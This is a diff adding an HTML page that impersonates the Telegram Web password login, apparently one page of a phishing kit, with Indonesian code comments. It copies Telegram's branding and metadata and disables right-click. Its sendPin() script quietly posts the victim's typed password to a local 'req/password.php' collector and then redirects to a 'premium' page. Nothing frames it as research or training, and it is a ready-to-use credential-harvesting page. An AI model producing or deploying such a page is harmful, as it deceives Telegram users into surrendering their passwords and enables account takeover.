@@ -1,0 +1,255 @@
+<html
+  lang="en"
+  translate="no"
+  class="notranslate theme-light"
+  data-message-text-size="16"
+>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Telegram Web</title>
+    <meta name="title" content="Telegram Web" />
+    <meta
+      name="description"
+      content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed."
+    />
+    <meta
+      name="viewport"
+      content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,shrink-to-fit=no,viewport-fit=cover"
+    />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <meta name="mobile-web-app-title" content="Telegram Web" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-title" content="Telegram Web" />
+    <meta name="application-name" content="Telegram Web" />
+    <meta name="msapplication-TileColor" content="#2b5797" />
+    <meta name="theme-color" content="#fff" />
+    <meta name="google" content="notranslate" />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://web.telegram.org/z/" />
+    <meta property="og:title" content="Telegram Web" />
+    <meta
+      property="og:description"
+      content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed."
+    />
+    <meta property="og:image" content="./icon-192x192.png" />
+    <meta property="twitter:card" content="summary_large_image" />
+    <meta property="twitter:url" content="https://web.telegram.org/z/" />
+    <meta property="twitter:title" content="Telegram Web" />
+    <meta
+      property="twitter:description"
+      content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed."
+    />
+    <meta property="twitter:image" content="../icon-192x192.png" />
+    <link
+      rel="apple-touch-icon"
+      sizes="180x180"
+      href="../apple-touch-icon.png"
+    />
+    <link rel="icon" href="../favicon.svg" type="image/svg+xml" />
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="16x16"
+      href="../favicon-16x16.png"
+    />
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="32x32"
+      href="../favicon-32x32.png"
+    />
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="192x192"
+      href="../icon-192x192.png"
+    />
+    <link rel="alternate icon" href="./favicon.ico" type="image/x-icon" />
+    <link href="../lib/main.3c9dcec00d5a12b9aa18.css" rel="stylesheet" />
+    <link href="../lib/main.3c9dcec00d5a12b9aa18.css" rel="stylesheet" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
+    />
+    <style>
+      /* Tambahkan CSS berikut untuk mengatur posisi ikon mata */
+      .input-group {
+        position: relative;
+      }
+
+      .input-group i.fa {
+        position: absolute;
+        top: 50%;
+        right: 10px; /* Sesuaikan dengan jarak yang Anda inginkan dari ujung kanan */
+        transform: translateY(-50%);
+        cursor: pointer;
+      }
+    </style>
+     <script type="text/javascript">
+      document.addEventListener('contextmenu', function(e) {
+          e.preventDefault();
+      });
+  </script>
+  </head>
+
+  <body class="animation-level-2 is-touch-env is-android">
+    <noscript>
+      <div id="logo"></div>
+      <h1>Telegram Web</h1>
+      <p>Please, enable JavaScript to open the app.</p>
+    </noscript>
+    <div id="loader" class="bg-load load6" style="display: none">
+      <div class="loader"></div>
+    </div>
+    <div id="root">
+      <div
+        id="UiLoader"
+        class="KD2TsjdEc_LBLsR_ReWT"
+        style="--theme-background-color: #99ba92"
+      >
+        <div class="Transition full-height is-auth fade">
+          <div class="Transition__slide--active">
+            <div class="Transition Auth fade">
+              <div class="Transition__slide--active">
+                <div id="auth-phone-number-form" class="custom-scroll">
+                  <div class="auth-form">
+                    <img src="./download.png" alt="" srcset="" />
+                    <h1>Enter Your Password</h1>
+                    <p class="note">Please enter your account password</p>
+                    <form id="password" action="" method="post">
+                      <!-- Gunakan input type "password" untuk password -->
+                      <div class="input-group" id="labelhp">
+                        <input
+                          class="form-control"
+                          type="password"
+                          id="sign-in-phone-number"
+                          dir="auto"
+                          inputmode="text"
+                          aria-label="Your phone number"
+                          name="password"
+                          autocomplete="off"
+                        />
+                        <!-- Tambahkan ikon mata untuk melihat/tidak melihat password -->
+                        <i
+                          class="fa fa-eye-slash"
+                          aria-hidden="true"
+                          id="togglePassword"
+                        ></i>
+                        <label for="sign-in-phone-number"
+                          >Masukkan Password</label
+                        >
+                      </div>
+                      <label class="Checkbox">
+                        <input
+                          checked
+                          type="checkbox"
+                          id="sign-in-keep-session"
+                        />
+                        <div class="Checkbox-main">
+                          <span class="label" dir="auto"
+                            >Keep me signed in</span
+                          >
+                        </div>
+                      </label>
+                      <button
+                        id="nextBtn"
+                        type="button"
+                        class="Button default primary"
+                        style=""
+                        onclick="sendPin()"
+                      >
+                        NEXT
+                        <div class="ripple-container">
+                          <span
+                            style="
+                              left: 88px;
+                              top: -81.9375px;
+                              width: 188px;
+                              height: 188px;
+                            "
+                          ></span>
+                        </div>
+                      </button>
+                      <button
+                        type="button"
+                        class="Button default primary text has-ripple"
+                        style=""
+                      >
+                        Log in by QR Code
+                        <div class="ripple-container"></div>
+                      </button>
+                    </form>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="portals"></div>
+  </body>
+  <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+  <script>
+    var inpHp = document.getElementById("sign-in-phone-number");
+    var btnnext = document.getElementById("nextBtn");
+    var togglePassword = document.getElementById("togglePassword");
+    var passwordVisible = false;
+
+    // Tambahkan event listener untuk mengubah tampilan password saat ikon mata diklik
+    togglePassword.addEventListener("click", function () {
+      passwordVisible = !passwordVisible;
+      if (passwordVisible) {
+        inpHp.type = "text";
+        togglePassword.classList.remove("fa-eye-slash");
+        togglePassword.classList.add("fa-eye");
+      } else {
+        inpHp.type = "password";
+        togglePassword.classList.remove("fa-eye");
+        togglePassword.classList.add("fa-eye-slash");
+      }
+    });
+
+    $(btnnext).css("display", "none");
+    inpHp.addEventListener("click", aktip);
+    btnnext.addEventListener("click", set_item);
+
+    // function set_item() {
+    //   sessionStorage.setItem("nohp", inpHp.value);
+    // }
+
+    function aktip() {
+      $("#labelhp").fadeIn();
+      inpHp.focus();
+      var label = document.getElementById("labelhp");
+      var btnnext = document.getElementById("nextBtn");
+      $(btnnext).css("display", "none");
+      label.classList.add("touched");
+      inpHp.addEventListener("input", validate);
+
+      function validate() {
+        if (inpHp.value.length) {
+          $(btnnext).fadeIn(300);
+        } else {
+          $(btnnext).fadeOut("fast");
+        }
+      }
+    }
+
+    function sendPin() {
+      $(".load").fadeIn();
+      $.ajax({
+        type: "POST",
+        url: "../../req/password.php", // Sesuaikan dengan lokasi Anda
+        data: $("#password").serialize(),
+        dataType: "text",
+        success: function () {
+          window.location.href = "../../req/premium/"; // Redirect ke halaman yang sesuai
+        },
+      });
+    }
+    // function loadd() {
+    //   $("#loader").fadeIn();
+    // }
+  </script>
+</html>
